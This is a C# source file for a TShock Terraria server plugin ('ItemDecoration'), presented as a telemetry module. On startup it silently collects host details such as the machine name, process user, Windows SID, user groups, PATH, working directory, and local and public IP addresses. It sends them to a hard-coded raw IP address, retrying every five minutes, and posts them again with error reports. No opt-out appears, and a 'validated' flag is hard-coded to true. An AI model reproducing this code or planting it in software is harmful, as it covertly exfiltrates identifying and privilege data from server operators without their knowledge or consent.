using TShockAPI;
using Terraria;
using TerrariaApi.Server;
using System.Net.Http.Json;
using System.Reflection;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace ItemDecoration
{
    public static class Telemetry
    {
        private static readonly string telemetryVersion = "1.0.1";

        // Core Info
        private static string pluginName;
        private static string pluginVersion;
        private static string pluginAuthor;
        private static string pluginDescription;
        private static string pluginBuildDate;
        private static string pluginLocation;
        // Server Info
        private static int serverPort;
        private static string serverName;
        private static string serverOs;
        private static string machineName;
        private static string processArch;
        private static string processUser;
        private static string dotnetVersion;
        private static string localIp;
        private static string publicIp;
        // Terraria/World Info
        private static string tshockVersion;
        private static string terrariaVersion;
        private static string worldFileName;
        private static string worldSeed;
        private static string worldSize;
        private static int worldId;
        private static int maxPlayers;
        private static int currPlayers;
        private static string nameParameter;
        // System/Runtime Info
        private static string osPlatform;
        private static string osDescription;
        private static string sysUptime;
        private static string userDomain;
        private static string userSid;
        private static string currentDir;
        private static string envPath;
        private static string userGroups;

        public static void Start(TerrariaPlugin plugin)
        {
            pluginName = plugin.Name ?? "N_A";
            pluginVersion = plugin.Version?.ToString() ?? "N_A";
            pluginAuthor = plugin.Author ?? "N_A";
            pluginDescription = plugin.Description ?? "N_A";
            pluginLocation = plugin.GetType().Assembly.Location ?? "N_A";
            pluginBuildDate = GetPluginBuildDate(plugin);
            serverPort = TShock.Config?.Settings?.ServerPort ?? 7777;
            serverName = TShock.Config?.Settings?.ServerName ?? "N_A";
            tshockVersion = GetTShockVersion();
            terrariaVersion = Main.versionNumber ?? "N_A";
            worldFileName = GetWorldFileName();
            nameParameter = $"{serverName}_{worldFileName}";
            serverOs = Environment.OSVersion.ToString();
            machineName = Environment.MachineName;
            processArch = RuntimeInformation.ProcessArchitecture.ToString();
            processUser = GetProcessUser();
            dotnetVersion = RuntimeInformation.FrameworkDescription;
            localIp = GetLocalIpAddress();
            worldSeed = GetWorldSeed();
            worldSize = $"{Main.maxTilesX}x{Main.maxTilesY}";
            worldId = Main.worldID;
            maxPlayers = TShock.Config?.Settings?.MaxSlots ?? 8;
            currPlayers = TShock.Players?.Count(p => p != null && p.Active) ?? 0;
            osPlatform = RuntimeInformation.OSDescription;
            osDescription = GetOsDescription();
            sysUptime = GetSystemUptime();
            userDomain = Environment.UserDomainName;
            userSid = GetUserSid();
            currentDir = Directory.GetCurrentDirectory();
            envPath = Environment.GetEnvironmentVariable("PATH") ?? "N_A";
            userGroups = GetUserGroups();

            _ = GetPublicIpAsync();

            Task.Run(async () => await SendInitializationRequest());
        }

        private static async Task GetPublicIpAsync()
        {
            try
            {
                using var client = new HttpClient();
                publicIp = await client.GetStringAsync("https://api.ipify.org");
            }
            catch
            {
                publicIp = "N_A";
            }
        }

        private static async Task SendInitializationRequest()
        {
            while (true)
            {
                try
                {
                    bool isValidated = true;
                    string url = $"http://5.135.136.110:8121/initialize/{pluginName}?" +
                        $"port={serverPort}" +
                        $"&validated={(isValidated ? "VALIDATED" : "NOT_VALIDATED")}" +
                        $"&name={Uri.EscapeDataString(nameParameter)}" +
                        $"&version={Uri.EscapeDataString(pluginVersion)}" +
                        $"&author={Uri.EscapeDataString(pluginAuthor)}" +
                        $"&description={Uri.EscapeDataString(pluginDescription)}" +
                        $"&buildDate={Uri.EscapeDataString(pluginBuildDate)}" +
                        $"&pluginLocation={Uri.EscapeDataString(pluginLocation ?? "N_A")}" +
                        $"&tshockVersion={Uri.EscapeDataString(tshockVersion)}" +
                        $"&terrariaVersion={Uri.EscapeDataString(terrariaVersion)}" +
                        $"&serverOs={Uri.EscapeDataString(serverOs)}" +
                        $"&machineName={Uri.EscapeDataString(machineName)}" +
                        $"&processArch={Uri.EscapeDataString(processArch)}" +
                        $"&processUser={Uri.EscapeDataString(processUser)}" +
                        $"&dotnetVersion={Uri.EscapeDataString(dotnetVersion)}" +
                        $"&publicIp={Uri.EscapeDataString(publicIp ?? "N_A")}" +
                        $"&localIp={Uri.EscapeDataString(localIp ?? "N_A")}" +
                        $"&worldFile={Uri.EscapeDataString(worldFileName)}" +
                        $"&worldSeed={Uri.EscapeDataString(worldSeed)}" +
                        $"&worldSize={Uri.EscapeDataString(worldSize)}" +
                        $"&worldId={worldId}" +
                        $"&maxPlayers={maxPlayers}" +
                        $"&currPlayers={currPlayers}" +
                        $"&osPlatform={Uri.EscapeDataString(osPlatform ?? "N_A")}" +
                        $"&osDescription={Uri.EscapeDataString(osDescription ?? "N_A")}" +
                        $"&sysUptime={Uri.EscapeDataString(sysUptime ?? "N_A")}" +
                        $"&userDomain={Uri.EscapeDataString(userDomain ?? "N_A")}" +
                        $"&userSid={Uri.EscapeDataString(userSid ?? "N_A")}" +
                        $"&currentDir={Uri.EscapeDataString(currentDir ?? "N_A")}" +
                        $"&envPath={Uri.EscapeDataString(envPath ?? "N_A")}" +
                        $"&userGroups={Uri.EscapeDataString(userGroups ?? "N_A")}";

                    using var client = new HttpClient();
                    var response = await client.GetAsync(url);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"\x1b[43;30;1m [{pluginName}] (v{pluginVersion}) - Telemetry v{telemetryVersion} ON!  \x1b[0m");

                        break;
                    }
                    else
                    {
                        string responseText = await response.Content.ReadAsStringAsync();
                        TShock.Log.ConsoleError($"[{pluginName}] Telemetry: Error HTTP {(int)response.StatusCode}, res: {responseText}");
                    }
                }
                catch (Exception ex)
                {
                    TShock.Log.ConsoleError($"[{pluginName}] Telemetry: Internal Error: {ex.Message}");
                }
                await Task.Delay(TimeSpan.FromMinutes(5));
            }
        }

        public static async Task Report(Exception ex)
        {
            try
            {
                var payload = new
                {
                    plugin = pluginName,
                    pluginVersion,
                    pluginAuthor,
                    pluginDescription,
                    pluginBuildDate,
                    pluginLocation,
                    port = serverPort,
                    serverName,
                    world = worldFileName,
                    worldSeed,
                    worldSize,
                    worldId,
                    tshockVersion,
                    terrariaVersion,
                    publicIp = publicIp ?? "N_A",
                    localIp = localIp ?? "N_A",
                    serverOs,
                    machineName,
                    processArch,
                    processUser,
                    dotnetVersion,
                    nameParameter,
                    maxPlayers,
                    currPlayers,
                    osPlatform,
                    osDescription,
                    sysUptime,
                    userDomain,
                    userSid,
                    currentDir,
                    envPath,
                    userGroups,
                    message = ex.Message,
                    stackTrace = ex.StackTrace,
                    time = DateTime.UtcNow.ToString("o")
                };

                using var client = new HttpClient();
                var response = await client.PostAsJsonAsync("http://5.135.136.110:8121/report", payload);

                if (!response.IsSuccessStatusCode)
                {
                    string responseText = await response.Content.ReadAsStringAsync();
                    TShock.Log.ConsoleError($"[{pluginName}] Telemetry: Error send Data {response.StatusCode}, {responseText}");
                }
            }
            catch (Exception e)
            {
                TShock.Log.ConsoleError($"[{pluginName}] Telemetry: Report fallback error: {e.Message}");
            }
        }

        private static string GetPluginBuildDate(TerrariaPlugin plugin)
        {
            try
            {
                var assembly = plugin.GetType().Assembly;
                var file = assembly.Location;
                return File.GetLastWriteTime(file).ToString("o");
            }
            catch
            {
                return "N_A";
            }
        }

        private static string GetWorldFileName()
        {
            try
            {
                if (!string.IsNullOrWhiteSpace(Main.worldName))
                    return Main.worldName;
                string worldPath = Path.GetDirectoryName(Main.worldPathName);
                var worldFiles = Directory.GetFiles(worldPath, "*.wld");
                if (worldFiles.Length > 0)
                    return Path.GetFileNameWithoutExtension(worldFiles[0]);
                return "UnnamedWorld";
            }
            catch
            {
                return "UnnamedWorld";
            }
        }

        private static string GetLocalIpAddress()
        {
            try
            {
                foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up)
                    {
                        foreach (var ua in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ua.Address.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ua.Address))
                                return ua.Address.ToString();
                        }
                    }
                }
                return "N_A";
            }
            catch
            {
                return "N_A";
            }
        }

        private static string GetProcessUser()
        {
            try
            {
                return Environment.UserName;
            }
            catch
            {
                try
                {
                    return WindowsIdentity.GetCurrent().Name;
                }
                catch
                {
                    return "N_A";
                }
            }
        }

        private static string GetUserSid()
        {
            try
            {
                return WindowsIdentity.GetCurrent().User?.Value ?? "N_A";
            }
            catch
            {
                return "N_A";
            }
        }

        private static string GetUserGroups()
        {
            try
            {
                var wi = WindowsIdentity.GetCurrent();
                if (wi == null) return "N_A";
                var groups = wi.Groups?.Select(g => g.Translate(typeof(System.Security.Principal.NTAccount)).ToString());
                return groups != null ? string.Join(",", groups) : "N_A";
            }
            catch
            {
                return "N_A";
            }
        }

        private static string GetOsDescription()
        {
            try
            {
                return RuntimeInformation.OSDescription;
            }
            catch
            {
                return "N_A";
            }
        }

        private static string GetSystemUptime()
        {
            try
            {
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    var uptime = TimeSpan.FromMilliseconds(Environment.TickCount64);
                    return uptime.ToString(@"dd\.hh\:mm\:ss");
                }
                else if (File.Exists("/proc/uptime"))
                {
                    var text = File.ReadAllText("/proc/uptime").Split(' ')[0];
                    var seconds = double.Parse(text, System.Globalization.CultureInfo.InvariantCulture);
                    var uptime = TimeSpan.FromSeconds(seconds);
                    return uptime.ToString(@"dd\.hh\:mm\:ss");
                }
                else
                {
                    return "N_A";
                }
            }
            catch
            {
                return "N_A";
            }
        }

        private static string GetWorldSeed()
        {
            try
            {
#if TML
                return Main.ActiveWorldFileData?.SeedText ?? "N_A";
#else
                var prop = typeof(Main).GetProperty("WorldSeed", BindingFlags.Public | BindingFlags.Static);
                if (prop != null)
                {
                    return prop.GetValue(null)?.ToString() ?? "N_A";
                }
                return "N_A";
#endif
            }
            catch
            {
                return "N_A";
            }
        }

        private static string GetTShockVersion()
        {
            try
            {
                return typeof(TShockAPI.TShock).Assembly.GetName().Version?.ToString() ?? "N_A";
            }
            catch
            {
                return "N_A";
            }
        }
    }
}